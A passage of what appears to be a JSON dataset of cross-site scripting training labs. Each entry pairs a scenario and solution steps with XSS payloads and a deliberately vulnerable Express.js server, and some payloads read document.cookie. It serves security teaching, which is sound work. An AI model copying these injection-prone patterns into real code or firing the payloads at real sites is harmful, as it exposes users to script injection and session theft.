  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/blog', (req, res) => {\n  const renderedComments = comments.map(c => `<p>${c}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Blog Post</h2>\n        <p>Interesting article about security!</p>\n        <h3>Comments</h3>\n        ${renderedComments}\n        <form action='/comment' method='POST'>\n          <input name='text' placeholder='Comment here'>\n          <button>Post</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/comment', (req, res) => {\n  console.log('[LOG] New comment:', req.body.text);\n  comments.push(req.body.text);\n  res.redirect('/blog');\n});\n\napp.listen(3000, () => console.log('Blog server running'));\n"
},
{
  "Lab scenario": "Reflected XSS in Support Ticket Viewer",
  "Lab Description": "The support dashboard displays ticket previews by taking `title` and `desc` as query parameters. These are inserted into the DOM without escaping, allowing reflected XSS via the `desc` field.\nTo solve: Inject a script in the desc parameter to trigger an alert on preview.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Visit /ticket?title=Help&desc=Issue+Details.",
    "Replace desc with a script payload like <script>alert('XSS')</script>.",
    "Load the page and observe reflected script execution.",
    "Try encoding the payload if filters exist.",
    "Confirm that every load with the payload triggers alert."
  ],
  "payloads": [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('Reflected')>",
    "<svg/onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/ticket', (req, res) => {\n  const { title = 'No Title', desc = 'No Description' } = req.query;\n  console.log('[DEBUG] Ticket received:', { title, desc });\n  res.send(`\n    <html>\n      <body>\n        <h2>Support Ticket</h2>\n        <h3>${title}</h3>\n        <p>${desc}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Ticket Viewer running on 3000'));\n"
},
{
  "Lab scenario": "DOM-based XSS via Drag-and-Drop Upload Preview",
  "Lab Description": "The dashboard includes a drag-and-drop file upload zone with preview text. The application sets the preview using `innerHTML` from the dragged file name without sanitization.\nTo solve: Simulate a drag-drop event with a crafted filename triggering script execution.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Open DevTools and simulate a drag-and-drop event with a fake File object.",
    "Set file name to: <img src=x onerror=alert('XSS')>.",
    "Drop it in the upload zone and observe script execution.",
    "Try encoded variants and payloads with data URIs.",
    "Confirm reliable trigger without actual file upload."
  ],
  "payloads": [
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert(document.domain)"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.use(express.static('.'));\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='drop-zone'>Drop file here</div>\n        <div id='preview'></div>\n        <script>\n          const dropZone = document.getElementById('drop-zone');\n          dropZone.addEventListener('drop', (e) => {\n            e.preventDefault();\n            const file = e.dataTransfer.files[0];\n            document.getElementById('preview').innerHTML = file.name;\n          });\n          dropZone.addEventListener('dragover', e => e.preventDefault());\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Stored XSS in ChatBot Interaction History",
  "Lab Description": "A web-based chatbot logs previous interactions and loads them from local storage using `innerHTML`. Messages are not encoded before rendering, allowing injection.\nTo solve: Inject a payload into localStorage and reload to trigger XSS.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Open console and set localStorage.setItem('chatLog', '<img src=x onerror=alert(1)>').",
    "Refresh the page and check the chat area.",
    "Confirm the script executes.",
    "Try payloads with event handlers or <details>/<summary> tags.",
    "Test visibility and stealth of payloads in different themes."
  ],
  "payloads": [
    "<img src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert(1)>X</details>",
    "<svg onload=alert(document.cookie)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='chat'></div>\n        <script>\n          const log = localStorage.getItem('chatLog');\n          if (log) document.getElementById('chat').innerHTML = log;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Reflected XSS via Username in WebSocket Debug Echo",
  "Lab Description": "A debug tool sends WebSocket messages with a username in the query string. The page reflects the username using `document.write`, exposing it to XSS.\nTo solve: Craft a URL with a payload in the `user` parameter that executes in real-time.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Access /ws-debug?user=<svg/onload=alert(1)>.",
    "Observe payload reflected and executed.",
    "Test vectors with WebSocket events and reconnect attempts.",
    "Use minimal tags to bypass CSP or validation.",
    "Confirm script executes before WebSocket connection opens."
  ],
  "payloads": [
    "<svg/onload=alert('XSS')>",
    "<img src=x onerror=alert('WS XSS')>",
    "<script>alert('Injected')</script>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/ws-debug', (req, res) => {\n  const user = req.query.user || 'guest';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          document.write('<div>Welcome ${user}</div>');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Stored XSS in Theme Name for Admin Preview",
  "Lab Description": "Admin panel allows creating custom UI themes. The theme name is stored and reflected without escaping in a preview panel using `innerHTML`.\nTo solve: Inject a payload as a theme name, save it, and preview to trigger XSS.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Login as admin and create a theme with name: <img src=x onerror=alert('XSS')>.",
    "Save the theme and go to preview section.",
    "Confirm payload executes in theme header.",
    "Try encoded scripts or nested tag vectors.",
    "Validate persistence across user sessions."
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('Theme XSS')>",
    "<script>alert('Theme Injected')</script>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet themeName = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-theme', (req, res) => {\n  themeName = req.body.name;\n  res.redirect('/preview-theme');\n});\n\napp.get('/preview-theme', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h1>Preview: ${themeName}</h1>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "DOM-based XSS in URL Fragment-based Loader",
  "Lab Description": "A documentation site loads pages based on the URL fragment and injects it into the DOM using `innerHTML`. No validation is done on the hash, enabling XSS.\nTo solve: Craft a URL with a malicious hash and observe DOM execution.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Access /#<img src=x onerror=alert('XSS')>.",
    "Watch how the fragment is injected into the page.",
    "Confirm DOM-based XSS on reload.",
    "Use nested <template> or <marquee> for stealth.",
    "Test on different browsers for reliability."
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('Hash XSS')>",
    "<marquee onstart=alert('XSS')>hi</marquee>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='doc'></div>\n        <script>\n          const hash = location.hash.slice(1);\n          document.getElementById('doc').innerHTML = hash;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},

{
  "Lab scenario": "Reflected XSS via Search Suggestion Parameter",
  "Lab Description": "The search page accepts a `suggest` parameter that is reflected directly into a live suggestion box using `innerHTML`. There is no sanitization, and script injection is possible.\nTo solve: Inject a payload via the suggest parameter and trigger execution in the suggestion box.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Navigate to /search?suggest=<img src=x onerror=alert(1)>",
    "Observe the suggestion box rendering the payload",
    "Try inline scripts or attribute-based vectors",
    "Confirm execution on every keypress if the parameter updates dynamically"
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(document.domain)>",
    "<script>alert('Reflected')</script>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const suggest = req.query.suggest || '';\n  res.send(`\n    <html>\n      <body>\n        <div>Suggestions:</div>\n        <div id='suggestion-box'></div>\n        <script>\n          document.getElementById('suggestion-box').innerHTML = '${suggest}';\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Stored XSS in Comment System Avatar Field",
  "Lab Description": "Users can leave comments with a custom avatar URL. The server stores the avatar field and renders it in an <img> tag without validation.\nTo solve: Submit a comment with an avatar containing a malicious payload.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Submit a comment with avatar: x onerror=alert(1)",
    "Reload the page to trigger the <img> tag error handler",
    "Try payloads with event handlers or SVG URIs",
    "Confirm persistence across multiple sessions"
  ],
  "payloads": [
    "x onerror=alert(1)",
    "x\" onerror=\"alert('stored')",
    "data:image/svg+xml,<svg onload=alert(1)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push({ user: req.body.user, avatar: req.body.avatar });\n  res.redirect('/comments');\n});\n\napp.get('/comments', (req, res) => {\n  const list = comments.map(c => `<div><img src='${c.avatar}'><b>${c.user}</b></div>`).join('');\n  res.send(`<html><body>${list}</body></html>`);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "DOM XSS via Dynamic FAQ Loader",
  "Lab Description": "The FAQ page loads answers based on the question ID from the URL and inserts content using `innerHTML`. It trusts hash fragments and does not sanitize them.\nTo solve: Inject a payload into the fragment and observe script execution.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Go to /faq#<img src=x onerror=alert(1)>",
    "Observe the dynamic content area rendering your payload",
    "Test with scripts, SVG, or <video poster> vectors",
    "Confirm execution across different browsers"
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<svg onload=alert(document.cookie)>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/faq', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='faq-content'></div>\n        <script>\n          const hash = decodeURIComponent(location.hash.slice(1));\n          document.getElementById('faq-content').innerHTML = hash;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Reflected XSS in Email Invitation Link",
  "Lab Description": "A collaboration tool sends invitation links with a `ref` parameter that gets rendered on the join page using `document.write`. There’s no escaping.\nTo solve: Craft a malicious `ref` that executes JavaScript when opened.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Create a URL like /invite?ref=<script>alert('XSS')</script>",
    "Send to target or open directly",
    "Observe script execution before any validation happens",
    "Try encoding or malformed attribute injection"
  ],
  "payloads": [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert('ref')>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/invite', (req, res) => {\n  const ref = req.query.ref || '';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          document.write('Invited by: ' + '${ref}');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
},
{
  "Lab scenario": "Stored XSS in Image Gallery Title Field",
  "Lab Description": "An image gallery allows uploading a picture with a title. The title is rendered with `innerHTML` and stored without sanitization, allowing persistent XSS.\nTo solve: Upload an image with a malicious title payload.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Upload an image with a title: <img src=x onerror=alert(1)>",
    "Visit the gallery and find the injected title",
    "Confirm that the script executes without interaction",
    "Try stealthy payloads using <math> or <object>"
  ],
  "payloads": [
    "<img src=x onerror=alert(1)>",
    "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
    "<object data=x onerror=alert('XSS')>"
  ],
  "Vulnerability name": "Cross-site scripting",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet images = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/upload', (req, res) => {\n  images.push({ title: req.body.title });\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = images.map(i => `<div>${i.title}</div>`).join('');\n  res.send(`<html><body>${html}</body></html>`);\n});\n\napp.listen(3000);\n"
},
{
    "Lab scenario": "XSS via MathML inside SVG",
    "Lab Description": "The app allows users to upload and preview SVG content. When MathML is embedded within the SVG and improperly sanitized, script execution becomes possible.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Embed MathML with malicious payload inside SVG",
      "Submit to preview endpoint",
      "Script executes when SVG is rendered"
    ],
    "payloads": [
      "<svg><foreignObject><math><mtext><script>alert(1)</script></mtext></math></foreignObject></svg>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/upload-svg', (req, res) => {\n  const svg = req.body;\n  res.send(`<html><body>${svg}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via JSONP callback reflection",
    "Lab Description": "The app provides JSONP API for legacy support. The callback parameter is not sanitized, allowing injection of arbitrary scripts.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft a malicious callback parameter",
      "Server reflects it directly",
      "Script executes in client"
    ],
    "payloads": [
      "alert(1)//",
      "console.log(document.cookie)//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/jsonp', (req, res) => {\n  const callback = req.query.callback;\n  const data = JSON.stringify({ message: \"hello\" });\n  res.type('text/javascript');\n  res.send(`${callback}(${data})`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via base64 decoded input injection",
    "Lab Description": "User input is expected to be base64 encoded. App decodes it and renders it directly without sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit base64 encoded HTML containing script",
      "Server decodes and injects",
      "Script executes"
    ],
    "payloads": [
      "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/decode', (req, res) => {\n  const encoded = req.query.q || '';\n  const decoded = Buffer.from(encoded, 'base64').toString('utf-8');\n  res.send(`<html><body>${decoded}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via email template injection",
    "Lab Description": "The app generates email previews using user input for testing. Email body is inserted directly into the preview with no output encoding.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject HTML inside email content field",
      "Email preview renders it",
      "Script executes"
    ],
    "payloads": [
      "<img src=x onerror=alert('Email XSS')>",
      "<script>alert(document.domain)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/preview-email', (req, res) => {\n  const body = req.body.body;\n  res.send(`<html><body>${body}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via PDF annotation preview",
    "Lab Description": "The app previews PDF annotation content in HTML. Malicious input in annotation text gets rendered without escaping.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Insert script in annotation content",
      "Preview renders raw HTML",
      "Script executes"
    ],
    "payloads": [
      "<script>alert('PDF')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/pdf-annotation-preview', (req, res) => {\n  const note = req.body.note;\n  res.send(`<html><body><div class='annotation'>${note}</div></body></html>`);\n});\n\napp.listen(3000);"
  },

  {
    "Lab scenario": "XSS via JavaScript URI in dynamically created script tag",
    "Lab Description": "The application allows users to submit URLs that are later injected into dynamically created script tags. JavaScript URIs are not filtered, allowing for immediate execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a URL with `javascript:` scheme",
      "App injects it into a script tag’s src",
      "Script executes on load"
    ],
    "payloads": [
      "javascript:alert(1)",
      "javascript:confirm(document.domain)"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/inject-script', (req, res) => {\n  const userURL = req.body.url;\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const s = document.createElement('script');\n          s.src = '${userURL}';\n          document.body.appendChild(s);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in real-time log console via WebSocket echo",
    "Lab Description": "Admin panel shows logs via WebSocket. Logs reflect user actions in real-time. Injecting a script into the action message causes script execution on admin’s panel.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Send a WebSocket message containing script",
      "Admin console reflects it",
      "Script executes in admin’s view"
    ],
    "payloads": [
      "<script>fetch('/admin?cookie=' + document.cookie)</script>",
      "<img src=x onerror=alert('admin')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\nlet logs = [];\n\nwss.on('connection', ws => {\n  ws.on('message', msg => {\n    logs.push(msg);\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(msg);\n      }\n    });\n  });\n});\n\napp.get('/admin', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Live Logs</h2>\n        <div id='log'></div>\n        <script>\n          const ws = new WebSocket('ws://' + location.host);\n          ws.onmessage = e => {\n            document.getElementById('log').innerHTML += e.data + '<br>';\n          };\n        </script>\n      </body>\n    </html>\n  `);\n});\n\nserver.listen(3000);"
  },
  {
    "Lab scenario": "XSS via open redirect preview page",
    "Lab Description": "User can preview a redirect destination. The redirect URL is rendered in a sandboxed iframe. Improper escaping in `srcdoc` leads to JS execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Inject HTML inside `srcdoc` attribute",
      "Iframe renders it unsanitized",
      "Payload executes"
    ],
    "payloads": [
      "<script>alert('redirect')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/redirect-preview', (req, res) => {\n  const dest = req.query.dest || 'Not provided';\n  res.send(`\n    <html>\n      <body>\n        <h3>Redirect Preview</h3>\n        <iframe srcdoc=\"${dest}\"></iframe>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via `<object>` tag with data attribute",
    "Lab Description": "App uses `<object>` tags to display user-provided content from the `data` attribute. Improper validation of data leads to XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit an HTML file or JS payload as object `data`",
      "App embeds it into object tag",
      "Code executes"
    ],
    "payloads": [
      "data:text/html,<script>alert(1)</script>",
      "data:text/html,<img src=x onerror=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/object-viewer', (req, res) => {\n  const userData = req.body.src;\n  res.send(`\n    <html>\n      <body>\n        <object data=\"${userData}\" width=\"300\" height=\"200\"></object>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via malformed comment rendering",
    "Lab Description": "The app renders user comments using innerHTML, but accepts malformed tags. Browsers correct the tag structure, allowing execution of orphaned scripts.",
    "Difficulty Level": "Low",
    "Solution Steps": [
      "Submit malformed comment with broken tag",
      "Browser fixes structure, script executes"
    ],
    "payloads": [
      "<b><script>alert(1)</script>",
      "<style><img src=x onerror=alert(1)></style>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/view');\n});\n\napp.get('/view', (req, res) => {\n  const out = comments.map(c => `<div>${c}</div>`).join('');\n  res.send(`<html><body>${out}</body></html>`);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via CSS `attr()` Injection",
    "Lab Description": "The application reflects user input in a custom attribute used in CSS `content: attr(...)`, leading to script execution via `expression()` in legacy browsers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit input inside custom attribute",
      "Style uses `content: attr(data-x)`",
      "Inject JS in attribute; legacy support may trigger execution"
    ],
    "payloads": [
      "\" data-x=\"javascript:alert(1)",
      "\" style=\"content:attr(data-x);"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/profile', (req, res) => {\n  const name = req.body.name;\n  res.send(`\n    <html>\n      <head>\n        <style>\n          .x::after { content: attr(data-x); }\n        </style>\n      </head>\n      <body>\n        <div class=\"x\" data-x=\"${name}\"></div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS through `svg` ForeignObject Execution",
    "Lab Description": "App renders user input inside an `<svg>` tag. Malicious `<foreignObject>` embedded allows HTML + JS inside SVG context.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Inject SVG with foreignObject containing HTML",
      "Script inside executes in browsers that support it"
    ],
    "payloads": [
      "<svg><foreignObject><body xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></body></foreignObject></svg>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/upload-svg', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        ${req.body}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS inside Event Handler JSON-to-HTML Rendering",
    "Lab Description": "Application parses user-submitted JSON and injects values into event handler attributes (`onclick`, etc.), allowing code injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit JSON with `onclick` value containing JS",
      "App renders button with dynamic attributes",
      "Click triggers execution"
    ],
    "payloads": [
      "{\"text\":\"Click me\", \"onclick\":\"alert(1)\"}"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/render-button', (req, res) => {\n  const { text, onclick } = req.body;\n  res.send(`\n    <html>\n      <body>\n        <button onclick=\"${onclick}\">${text}</button>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in `srcdoc` Attribute of iframe",
    "Lab Description": "App allows user input inside iframe `srcdoc`, which is directly rendered as inline HTML and JS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit payload as content of `srcdoc`",
      "App embeds value as-is",
      "JS executes inside iframe"
    ],
    "payloads": [
      "<script>alert('srcdoc')</script>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/iframe-srcdoc', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <iframe srcdoc=\"${req.body}\"></iframe>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via `details` and `summary` Expansion",
    "Lab Description": "User input rendered inside a `details` block gets interpreted as full HTML, including executable scripts or event handlers.",
    "Difficulty Level": "Low",
    "Solution Steps": [
      "Inject HTML with event inside `summary`",
      "Click expands, triggers script"
    ],
    "payloads": [
      "<summary onclick=alert(1)>Click</summary>",
      "<summary><img src=x onerror=alert(2)></summary>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/details-view', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <details>${req.body}</details>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Misused `meta` Refresh Tag",
    "Lab Description": "Application allows user input inside a meta refresh tag, enabling injection of JavaScript via `URL` attribute.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /redirect-meta?target=<payload>",
      "App reflects input in meta refresh tag",
      "Inject javascript: URI to execute code"
    ],
    "payloads": [
      "javascript:alert('metaXSS')",
      "javascript:confirm(document.domain)"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/redirect-meta', (req, res) => {\n  const target = req.query.target || '/';\n  res.send(`\n    <html>\n      <head>\n        <meta http-equiv=\"refresh\" content=\"0;url=${target}\">\n      </head>\n      <body>Redirecting...</body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS through Data URI in iframe Source",
    "Lab Description": "User input is embedded directly into an iframe `src`, allowing crafted `data:text/html` URIs with embedded scripts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send iframe with src=data:text/html;base64, payload",
      "App embeds src without sanitization",
      "Base64-decode triggers HTML + JS execution"
    ],
    "payloads": [
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YVhTUycpPC9zY3JpcHQ+",
      "data:text/html,<script>alert('data')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/preview-iframe', (req, res) => {\n  const src = req.query.src || 'about:blank';\n  res.send(`\n    <html>\n      <body>\n        <iframe src=\"${src}\"></iframe>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in `<math>` Tag with Malicious `href`",
    "Lab Description": "The app allows mathML rendering but doesn’t sanitize attributes. Injecting an `href` with `javascript:` scheme executes code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit `<math><a href=javascript:alert(1)>CLICK</a></math>`",
      "mathML rendered directly, executes JS in link",
      "Test in browsers supporting mathML"
    ],
    "payloads": [
      "<math><a href=javascript:alert('mathXSS')>X</a></math>",
      "<math><mtext><a href=javascript:alert(1)>click</a></mtext></math>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/render-math', (req, res) => {\n  res.send(`\n    <html>\n      <body>${req.body}</body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via Object `data` Attribute",
    "Lab Description": "User input is embedded into an `<object>` tag’s `data` attribute, allowing attacker to inject `data:` URLs with malicious HTML.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit object with `data=data:text/html,...`",
      "App embeds data URL directly in object",
      "Browser renders HTML inside object"
    ],
    "payloads": [
      "data:text/html,<script>alert('objectXSS')</script>",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/load-object', (req, res) => {\n  const src = req.query.url || 'about:blank';\n  res.send(`\n    <html>\n      <body>\n        <object data=\"${src}\"></object>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS inside `template` Element via DOM Cloning",
    "Lab Description": "App includes a `<template>` element and clones its content via JS. Injected script inside template gets executed after cloning.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject script inside template content",
      "Cloning via JS moves script into DOM",
      "Script gets parsed and executed"
    ],
    "payloads": [
      "<template><script>alert('templateXSS')</script></template>",
      "<template><img src=x onerror=alert(1)></template>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.text());\n\napp.post('/clone-template', (req, res) => {\n  const payload = req.body;\n  res.send(`\n    <html>\n      <body>\n        ${payload}\n        <script>\n          const tpl = document.querySelector('template');\n          const node = tpl.content.cloneNode(true);\n          document.body.appendChild(node);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS via CSS Expression in Legacy Quirks Mode",
    "Lab Description": "A legacy page renders in quirks mode and allows inline styles. Internet Explorer interprets CSS expressions as JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to /legacy-style",
      "Submit payload using inline `style` attribute",
      "Expression executes in IE quirks mode",
      "Use `expression(alert(1))` in style"
    ],
    "payloads": [
      "<div style=\"width:expression(alert('cssXSS'))\">",
      "<img style=\"top:expression(alert(1))\">"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/legacy-style', (req, res) => {\n  const html = `\n    <html>\n      <head>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=EmulateIE7\">\n      </head>\n      <body>\n        <div>${req.query.content || ''}</div>\n      </body>\n    </html>\n  `;\n  res.send(html);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "XSS in SVG <animate> Element Injection",
    "Lab Description": "User-submitted SVG is embedded without sanitization. The attacker abuses <animate> and other SVG elements to trigger JavaScript execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST SVG content with JavaScript inside animate attributes",
